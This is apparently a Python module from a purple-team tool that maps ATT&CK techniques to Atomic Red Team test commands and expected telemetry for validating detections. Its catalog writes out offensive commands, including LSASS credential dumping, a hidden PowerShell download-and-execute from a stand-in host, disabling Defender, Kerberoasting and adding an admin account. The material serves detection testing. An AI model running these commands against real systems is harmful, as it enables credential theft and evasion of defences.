"""Atomic Red Team (ART) test mappings and validation procedure generation.

Maps MITRE ATT&CK techniques to concrete Atomic Red Team test identifiers,
test commands, and expected telemetry signatures to enable purple-team
validation of threat hunting hypotheses and detection rules.
"""

from __future__ import annotations

from typing import Dict, List

# Curated catalog of Atomic Red Team tests for prominent enterprise techniques
ATOMIC_TESTS_MAP: Dict[str, List[Dict[str, str]]] = {
    "T1003.001": [
        {
            "name": "Dump LSASS.exe Memory using ProcDump",
            "test_id": "ART T1003.001 #1",
            "command": "procdump.exe -ma lsass.exe lsass.dmp",
            "telemetry": "Sysmon Event ID 10 (ProcessAccess to lsass.exe) / MDE DeviceProcessEvents",
        },
        {
            "name": "Dump LSASS.exe Memory using comsvcs.dll MiniDump",
            "test_id": "ART T1003.001 #3",
            "command": "rundll32.exe C:\\windows\\System32\\comsvcs.dll, #24 <lsass_pid> C:\\Windows\\Temp\\lsass.dmp full",
            "telemetry": "Sysmon Event ID 10 / Process Creation Event ID 4688 (rundll32.exe loading comsvcs.dll)",
        },
    ],
    "T1059.001": [
        {
            "name": "PowerShell Download and Execute",
            "test_id": "ART T1059.001 #1",
            "command": 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://example.com/payload.ps1 -OutFile $env:TEMP\\p.ps1; & $env:TEMP\\p.ps1"',
            "telemetry": "Windows Event ID 4104 (ScriptBlock Logging) / Sysmon Event ID 1 (powershell.exe with -EncodedCommand or -Command)",
        },
        {
            "name": "PowerShell Base64 Encoded Command Execution",
            "test_id": "ART T1059.001 #2",
            "command": "powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAA=",
            "telemetry": "Windows Event ID 4104 / EDR process command-line audit",
        },
    ],
    "T1059.003": [
        {
            "name": "Windows Command Shell Obfuscation and Execution",
            "test_id": "ART T1059.003 #1",
            "command": 'cmd.exe /c "set a=who& set b=ami& %a%%b%"',
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (cmd.exe execution with concatenated variables)",
        },
    ],
    "T1055": [
        {
            "name": "Process Injection via CreateRemoteThread",
            "test_id": "ART T1055 #1",
            "command": "Execute test harness writing shellcode to target process memory and invoking CreateRemoteThread",
            "telemetry": "Sysmon Event ID 8 (CreateRemoteThread) / MDE DeviceEvents (CreateRemoteThreadApiCall)",
        },
    ],
    "T1053.005": [
        {
            "name": "Scheduled Task Creation via schtasks",
            "test_id": "ART T1053.005 #1",
            "command": 'schtasks /create /sc minute /mo 1 /tn "AtomicValidationTask" /tr "calc.exe"',
            "telemetry": "Windows Event ID 4698 (A scheduled task was created) / Sysmon Event ID 1 (schtasks.exe /create)",
        },
    ],
    "T1562.001": [
        {
            "name": "Disable Windows Defender Real-Time Protection",
            "test_id": "ART T1562.001 #1",
            "command": "Set-MpPreference -DisableRealtimeMonitoring $true",
            "telemetry": "Windows Defender Event ID 5001 / PowerShell Event ID 4104",
        },
    ],
    "T1021.002": [
        {
            "name": "SMB Admin Share Mounting",
            "test_id": "ART T1021.002 #1",
            "command": "net use \\\\<target_host>\\C$ /user:<domain>\\<user> <password>",
            "telemetry": "Windows Event ID 5140 (A network share object was accessed) / Event ID 4624 (Type 3 Logon)",
        },
    ],
    "T1078": [
        {
            "name": "Local Account Creation and Group Addition",
            "test_id": "ART T1078 #1",
            "command": "net user /add atomic_hunter TempPass123! && net localgroup administrators atomic_hunter /add",
            "telemetry": "Windows Event ID 4720 (A user account was created) / 4728 (Member added to security group)",
        },
    ],
    "T1558.003": [
        {
            "name": "Kerberoasting via ServicePrincipalName Ticket Request",
            "test_id": "ART T1558.003 #1",
            "command": "Rubeus.exe kerberoast /nowrap /format:hashcat",
            "telemetry": "Windows Security Event ID 4769 (Kerberos Service Ticket Request with ticket encryption 0x17)",
        },
    ],
    "T1558.004": [
        {
            "name": "AS-REP Roasting for Accounts with Pre-Authentication Disabled",
            "test_id": "ART T1558.004 #1",
            "command": "Rubeus.exe asreproast /format:hashcat /nowrap",
            "telemetry": "Windows Security Event ID 4768 (TGT Request with Pre-Authentication Type 0 from non-DC client)",
        },
    ],
    "T1550.001": [
        {
            "name": "Application Access Token / OAuth Consent Abuse",
            "test_id": "ART T1550.001 #1",
            "command": "Emulate illicit OAuth application consent grant holding Mail.ReadWrite or Directory.ReadWrite.All scopes",
            "telemetry": "Entra ID / M365 Audit Log: 'Consent to application' / 'Add service principal'",
        },
    ],
    "T1071.001": [
        {
            "name": "Web Protocols C2 Periodic Beaconing",
            "test_id": "ART T1071.001 #1",
            "command": 'Invoke-RestMethod -Uri https://example.com/api/v1/ping -Headers @{"X-Beacon-ID"="test-42"} -Method Post',
            "telemetry": "Proxy / Web Gateway logs / Sysmon Event ID 3 (Network connection to external destination)",
        },
    ],
    "T1105": [
        {
            "name": "Ingress Tool Transfer via certutil.exe",
            "test_id": "ART T1105 #1",
            "command": "certutil.exe -urlcache -split -f http://example.com/test.txt C:\\Windows\\Temp\\test.txt",
            "telemetry": "Sysmon Event ID 1 (certutil.exe with -urlcache argument) / Event ID 11 (File creation in Temp)",
        },
    ],
    "T1574.002": [
        {
            "name": "DLL Side-Loading via Search Order Hijacking",
            "test_id": "ART T1574.002 #1",
            "command": "Place mock payload DLL into writable application folder alongside signed binary and execute binary",
            "telemetry": "Sysmon Event ID 7 (ImageLoad) of unsigned DLL from user-writable directory",
        },
    ],
    "T1036.005": [
        {
            "name": "Masquerading as Windows System Binary",
            "test_id": "ART T1036.005 #1",
            "command": "copy C:\\Windows\\System32\\cmd.exe C:\\Users\\Public\\svchost.exe && C:\\Users\\Public\\svchost.exe /c whoami",
            "telemetry": "Sysmon Event ID 1 (svchost.exe executing outside C:\\Windows\\System32\\)",
        },
    ],
    "T1082": [
        {
            "name": "System Information Discovery via Native Commands",
            "test_id": "ART T1082 #1",
            "command": "systeminfo && hostname && whoami",
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (systeminfo.exe process creation)",
        },
    ],
    "T1016": [
        {
            "name": "System Network Configuration Discovery",
            "test_id": "ART T1016 #1",
            "command": "ipconfig /all & route print & netstat -ano",
            "telemetry": "Windows Event ID 4688 / Sysmon Event ID 1 (network discovery commands)",
        },
    ],
    "T1047": [
        {
            "name": "WMI Process Creation via wmic.exe",
            "test_id": "ART T1047 #1",
            "command": 'wmic process call create "calc.exe"',
            "telemetry": "Windows Event ID 4688 (wmic.exe with process call create) / WMI-Activity Event ID 5861",
        },
    ],
}


def get_atomic_tests(technique_id: str) -> List[Dict[str, str]]:
    """Return matching Atomic Red Team test descriptors for an ATT&CK technique.

    Looks up specific sub-technique (e.g. 'T1003.001') then base technique (e.g. 'T1003').
    If unmapped, returns a structured procedural emulation template.
    """
    tid = technique_id.strip()
    if tid in ATOMIC_TESTS_MAP:
        return ATOMIC_TESTS_MAP[tid]

    base_tid = tid.split(".")[0]
    if base_tid in ATOMIC_TESTS_MAP:
        return ATOMIC_TESTS_MAP[base_tid]

    return [
        {
            "name": f"Procedural Emulation for {tid}",
            "test_id": f"ART {tid} #1 (Generic)",
            "command": f"# Execute controlled simulation of {tid} in dedicated test host",
            "telemetry": "Verify sensor telemetry (Process, Network, or Audit logs) captures the activity",
        }
    ]


def format_atomic_tests_markdown(techniques: List[str]) -> str:
    """Format matching Atomic Red Team tests as markdown for hunt briefs."""
    if not techniques:
        return ""

    lines = [
        "### Validation Procedure (Atomic Red Team)",
        "",
        "Execute these tests in a non-production test host to confirm detection logic and telemetry visibility:",
        "",
        "| Technique | Test ID | Procedure / Command | Expected Telemetry |",
        "|---|---|---|---|",
    ]

    seen_tests = set()
    for tid in techniques:
        tests = get_atomic_tests(tid)
        for t in tests:
            test_key = (tid, t["test_id"])
            if test_key in seen_tests:
                continue
            seen_tests.add(test_key)
            cmd = t["command"].replace("|", "\\|")
            telemetry = t["telemetry"].replace("|", "\\|")
            lines.append(f"| `{tid}` | **{t['test_id']}**<br>*{t['name']}* | `{cmd}` | {telemetry} |")

    lines.append("")
    return "\n".join(lines)
